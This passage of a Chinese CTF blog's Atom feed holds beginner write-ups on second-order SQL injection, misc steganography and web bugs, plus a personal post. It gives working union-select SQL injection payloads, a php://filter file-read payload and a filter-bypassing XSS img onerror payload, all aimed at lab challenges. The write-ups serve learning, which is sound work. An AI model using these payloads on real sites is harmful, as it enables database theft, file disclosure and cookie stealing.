title="总结"></a>总结</h1><p>这些也只是php弱类型的一点点知识而已，还有更多的东西没有写出来(其实我不会了)。<br>之前很早就想写这篇文章，一直拖到现在，不过也好，又学到了新的知识一起写到文章里了。<br>学习永远都是靠自己一个人，别人再厉害也只是别人而已，只有自己脚踏实地才能学到真的知识。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近强网杯还有其他比赛中，出现了许多php弱类型的题目。用这篇文章总结一下到目前学到的php弱类型。&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>记一次有趣的二次注入</title>
    <link href="http://zcluslloye.cn/2018/03/29/second-sqli/"/>
    <id>http://zcluslloye.cn/2018/03/29/second-sqli/</id>
    <published>2018-03-29T12:22:00.000Z</published>
    <updated>2018-11-14T09:38:07.602Z</updated>
    
    <content type="html"><![CDATA[<p>上周强网杯和安恒杯结束了，一直没有时间整理比赛中学习的知识，其实会做的题也不多，但学习的确实挺多，今天就来聊聊强网杯的一道较为简单的注入题。<br>题目是一道二次注入类型。二次注入是为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这些数据却又在“未被转义（Unescaped）”的查询窗体中重复使用。例如下面这道题目：<br>刚开始就给你一个注册页面，注册发现age参数存在注入点<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/second-sqli/01.png" alt=""><br>由于要求age必须为数字便采用hex绕过。随后便是常规的注入手法。<br><br>先判断列数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222 order by x#   //x为数字</span><br></pre></td></tr></table></figure><br>随后发现222 union select 1,2,3,4#依旧只有第一个参数有回显，便用and 1=2把222的参数回显注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">222 and 1=2 union select 1,2,3,4# //发现联合查询的第二个参数有回显</span><br><span class="line">222 and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()# //表名</span><br><span class="line">222 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_schema=database()#  //列名</span><br></pre></td></tr></table></figure><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/second-sqli/02.png" alt=""><br>得到表名和列名都是flag。接下来字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222 and 1=2 union select 1,flag,3,4 from flag# </span><br></pre></td></tr></table></figure><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/second-sqli/03.png" alt=""><br>拿到flag。<br>这次强网杯比赛中学到了新的注入姿势，和队友的比赛时也学到了其他许多东西。下次聊聊php弱类型，还有常见的php类型绕过。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上周强网杯和安恒杯结束了，一直没有时间整理比赛中学习的知识，其实会做的题也不多，但学习的确实挺多，今天就来聊聊强网杯的一道较为简单的注入题。&lt;br&gt;题目是一道二次注入类型。二次注入是为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>misc入门总结</title>
    <link href="http://zcluslloye.cn/2018/03/18/hgame-misc/"/>
    <id>http://zcluslloye.cn/2018/03/18/hgame-misc/</id>
    <published>2018-03-18T07:20:28.000Z</published>
    <updated>2018-11-14T09:34:41.892Z</updated>
    
    <content type="html"><![CDATA[<p>随着hgame线下赛的结束，这一阶段也该告一段落。回想一个多月，既开心又迷茫。平常偶尔打打ctf其实也是蛮开心的，但是当自己面对不会的题目时又十分迷茫(可能这就是咸鱼的痛苦吧)。<br>借此篇文章，也把剩下的自己对于misc的入门知识总结一下。<br><br>misc，在ctf比赛中也称杂项，大多数为取证题和脑洞题。其中取证题也大多需要脑洞，因此最常见的就是取证题。<br>下面我讲讲几类最常见的题型。</p><h1 id="隐写类"><a href="#隐写类" class="headerlink" title="隐写类"></a>隐写类</h1><p>隐写，通常是指在图片，音频，视频，文档中写入隐藏的数据，其中以图片隐写最为常见。</p><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><p>最基本的图片隐写：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-misc/01.png" alt=""><br>直接在linux下使用binwalk就可以发现一般的隐写数据。<br>还有高级一点的图片隐写：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-misc/02.png" alt=""><br>使用binwalk看不出任何东西，有可能是LSB最低位隐写。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-misc/03.png" alt=""><br>可以发现压缩包藏在最低位。<br><br>当然还有图片盲水印，一般来说两张图片在一起有可能是盲水印。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-misc/04.png" alt=""></p><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>基本的音频隐写和图片类似，把文件拖到binwalk就可以看到信息了。</p><p>音频lsb，和图片lsb类似，使用工具便可以将数据导出。常用的工具有：mp3stego，wavsteg.</p><h1 id="取证类"><a href="#取证类" class="headerlink" title="取证类"></a>取证类</h1><p>通常这类题目是给你一个流量包，让你分析其中和flag有关的信息。<br>最简单的取证题：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-misc/05.png" alt=""><br>使用wirewhark打开流量包简单查看便可以拿到flag。<br><br>流量包中与隐写，加密相关：<br>这类题目通常让你从流量包中抓住关键数据，保存文件进行分析，取证，例如：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-misc/06.png" alt=""><br>查看流量包看到一个压缩包和一张图片，随即下载压缩包和图片，发现压缩包加密，但压缩包中有一张同名的图片，随即进行明文攻击。（有空来写写有关压缩包的文章）<br><br><br>当然misc杂项并不止这些，只是现在的我能理解的就只有这么点而已。学习之路漫长而又艰辛，只有不断学习前进才能有所收获。虽然现在不会，但并不代表以后不会，不是吗？<br>因为心中存有信念，便无惧所有的挫折和苦难。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着hgame线下赛的结束，这一阶段也该告一段落。回想一个多月，既开心又迷茫。平常偶尔打打ctf其实也是蛮开心的，但是当自己面对不会的题目时又十分迷茫(可能这就是咸鱼的痛苦吧)。&lt;br&gt;借此篇文章，也把剩下的自己对于misc的入门知识总结一下。&lt;br&gt;&lt;br&gt;misc，在c
      
    
    </summary>
    
    
      <category term="misc" scheme="http://zcluslloye.cn/tags/misc/"/>
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门(坑)总结——web篇</title>
    <link href="http://zcluslloye.cn/2018/03/12/hgame-web/"/>
    <id>http://zcluslloye.cn/2018/03/12/hgame-web/</id>
    <published>2018-03-12T14:20:28.000Z</published>
    <updated>2018-11-14T09:35:44.971Z</updated>
    
    <content type="html"><![CDATA[<p>为期一个月的hgame寒假训练赛终于结束了。每周都在做题，讲真这么用功学习还真是很少见。当然，一个月时间自己也学到了很多(虽然还是咸鱼)，这里感谢学长们花了很长时间出题目，也感谢几位学长耐心给我解答=。=<br>这篇文章是对寒假学习知识的梳理，也仅代表本咸鱼的观点，如有错误请指出。另外，这边文章也以我在假期写的四篇wp作为参考，链接如下:<br><a href="https://github.com/zer0e/writeup2018" title="hgame2018_wp" target="_blank" rel="noopener">https://github.com/zer0e/writeup2018</a><br></p><h1 id="基础总结"><a href="#基础总结" class="headerlink" title="基础总结"></a>基础总结</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计通常不会单独成题目，而是结合web漏洞来成题，例如：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/01.png" alt=""><br><br>你首先需要审计代码才能知道该如何绕过限制(当然这段代码有点短)，先是知道pattern是什么，然后了解json怎么绕过。所以说代码审计在比赛中绝对是基础中的基础，对此你需要了解相应的语言。</p><h2 id="请求头的查看与修改"><a href="#请求头的查看与修改" class="headerlink" title="请求头的查看与修改"></a>请求头的查看与修改</h2><p>请求头在web中是最常见的东西，相应的请求头中的信息我们更需要加以利用。例如：</p><p><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/02.png" alt=""><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/03.png" alt=""><br>通过修改请求头来达到我们的目的。至于如何修改，之后说。</p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>工具的使用那就很多了。常见的web工具有burpsuite(一款强大的网络工具)，sqlmap(sql漏洞检查工具)等等，具体可以网上找找相应的ctf工具合集。这里我们可以用burpsuite来进行抓包改包重发包。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/04.png" alt=""><br>类似的工具还有很多，需要自己慢慢去摸索。</p><h2 id="脚本书写"><a href="#脚本书写" class="headerlink" title="脚本书写"></a>脚本书写</h2><p>脚本的书写通常是在工具已经无法满足我们要求时，我们需要自己书写脚本来实现某种特定的要求。这里我推荐的脚本语言为python，毕竟人生苦短，我用python。=。=假期的时候自己也写过一些脚本。这里就不贴出来了。</p><p>综上，想打ctf，基础知识和工具使用一定必不可少。下面讲讲新手会碰到的常见漏洞。</p><h1 id="常见漏洞梳理"><a href="#常见漏洞梳理" class="headerlink" title="常见漏洞梳理"></a>常见漏洞梳理</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>PHP当中有许多的常见的漏洞，其中最常见的就是文件包含漏洞。在假期的学习中，遇见的两题常见的文件包含漏洞。<br><br>1.直接通过修改文件路径来获得文件内容。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/05.png" alt=""><br>我们发现url后带有文件路径，随即修改路径为flag.php查看response即可拿到flag。<br><br>2.通过php伪协议来读取文件。那么什么是php伪协议？php中支持的伪协议有以下几种：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">//处理交互式的流</span></span><br></pre></td></tr></table></figure><br>这里我们重点要说的就是php://<br>先给出官方文档<br><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.php.php</a> <br><br>之后我会写一篇详细的文章讲讲我对php://伪协议的理解，这里便不再多讲。<br>回到题目，有时候我们无法通过直接输入文件名来获取文件，便需要使用php伪协议来把文件的base64编码后的内容读出，从而获得flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//我们常用的php任意文件读取payload</span><br><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure><br>这里使用的过滤器为convert.base64-encode，字面上就可以知道是把读取的内容encode成base64编码。过滤器的问题，我一起留到后面的文章。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/06.png" alt=""><br>以上就是常见的两种LFI漏洞的利用。                                                                                    </p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>xss，全程为Cross Site Scripting，也称跨站脚本攻击。攻击者通过在web页面中插入恶意的script代码，当有用户访问这个页面时，该用户就会受到攻击。xss分为存储型和反射型。反射型xss，是非持久的，只有用户自己点击链接才会触发。而存储型xss，是攻击者插入到服务器的恶意代码，例如博客文章等地方。这种xss通常比较危险。<br><br>要理解xss，就必须理解html语言。<br>例如：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/07.png" alt=""><br>出题者已经给出了关键代码。那么我们怎么去插入一段代码让网页弹窗出现数字1呢？<br>我们知道代码过滤了script，image还有左括号，由于img标签没有被过滤，我们就可以通过img标签的onerror来执行恶意代码。构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;&apos; onerror=alert&amp;#40;1)&gt;</span><br></pre></td></tr></table></figure><br>如此，便完成一次了xss攻击，事实上，攻击者通常将alert(1)换成其他恶意的代码来进行攻击，例如盗取cookie等等。</p><h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>sqli，通常意义上指数据库注入。攻击者通过对参数的修改来达到访问数据库的目的。<br>例如有以下的php语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&apos;user&apos;];</span><br><span class="line">$query=&quot;select * from users where username=&apos;&quot;.$user.&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure><br>由于没有任何过滤，攻击者可以通过修改user的值来对数据库进行访问。例如攻击者使username=’ and 1=1<br><br>那么后台的sql查询语句就变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;&apos; and 1=1;</span><br></pre></td></tr></table></figure><br>由于1=1为永真式，那么这条语句就会列出user表中的所有数据。这必定造成极大的危害。<br><br>sql注入通常有两类，有回显的注入和无回显的注入。有回显的注入又分为带有数据的回显型注入，基于布尔的注入，还有基于报错的注入等等。无回显的注入，一般有基于时间延迟的注入。<br><br>一般新手使用的是sql注入自动化工具——sqlmap，一个可以自动判断类型和自动注入的python脚本。但我还是希望每位初学者可以少用或者不用这些脚本，如果连原理都不明白，那也只是单纯的一个脚本小子而已。当你明白原理，知道怎么做之后，那用用别人的脚本确实是没什么的。<br><br>这些注入整理我也会在以后的学习和比赛中慢慢积累和学习，这里便不在多讲。<br><br>下面以一道例题结束这篇文章。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/08.png" alt=""><br>我们发现一个网站存在注入，并且后端已经有单引号了。<br>所以我们就可以进行爆库，也称脱库。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hgame-web/09.png" alt=""><br>这里先爆数据库的名称。一般来说sql注入题最后都有一个闭合符合#，但这题自动帮你加上了。(毕竟是新手题)<br>然后就是一爆到底了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//爆表名</span><br><span class="line">id=1 union select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line">//列名</span><br><span class="line">id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;xxxx&apos; //xxx是表的名称</span><br><span class="line">//字段名</span><br><span class="line">id=1 union select 1,yyy from xxx //xxx为表名，yyy为列名</span><br><span class="line"></span><br><span class="line">//提示：由于UNION 内部的每个 SELECT 语句必须拥有相同数量的列，所以union select 后有两个参数。</span><br></pre></td></tr></table></figure><br>这就是sql的新手入门题了。<br></p><p>这篇文章讲的不是很多，但算是我假期间对web知识的再学习和补充。下次我将讲讲我对ctf中misc杂项的入门总结。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为期一个月的hgame寒假训练赛终于结束了。每周都在做题，讲真这么用功学习还真是很少见。当然，一个月时间自己也学到了很多(虽然还是咸鱼)，这里感谢学长们花了很长时间出题目，也感谢几位学长耐心给我解答=。=&lt;br&gt;这篇文章是对寒假学习知识的梳理，也仅代表本咸鱼的观点，如有错误
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈博客</title>
    <link href="http://zcluslloye.cn/2018/03/10/talk-about-blog/"/>
    <id>http://zcluslloye.cn/2018/03/10/talk-about-blog/</id>
    <published>2018-03-10T10:32:47.000Z</published>
    <updated>2018-03-10T11:06:05.178Z</updated>
    
    <content type="html"><![CDATA[<p>以前就想写博客很久了，理由有很多，不管是记录生活，还是学习上的知识，我觉得都有必要记录下来。身边很多朋友都写文章，但是我并不喜欢，也不习惯去写东西。</p><p>然而，对于那些成堆的知识，我只能一点一点记忆下来。那时我萌生了写博客记录学习的想法，找了好几家博客但似乎都不符合我的要求，自己建站吧又嫌太麻烦。后来自己也得过且过，也没想过是时候该把自己所学的给记录下来。</p><p>前几天想想，以前学的知识也只是零零碎碎地在记忆中，最终还是决定自己搭建博客来记录我那为数不多的知识。。</p><p>我想生活不应该只有忙碌，还应该有心灵的思考。理想和激情也不能被现实磨灭。愿今后顺利。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以前就想写博客很久了，理由有很多，不管是记录生活，还是学习上的知识，我觉得都有必要记录下来。身边很多朋友都写文章，但是我并不喜欢，也不习惯去写东西。&lt;/p&gt;
&lt;p&gt;然而，对于那些成堆的知识，我只能一点一点记忆下来。那时我萌生了写博客记录学习的想法，找了好几家博客但似乎都不符
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://zcluslloye.cn/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
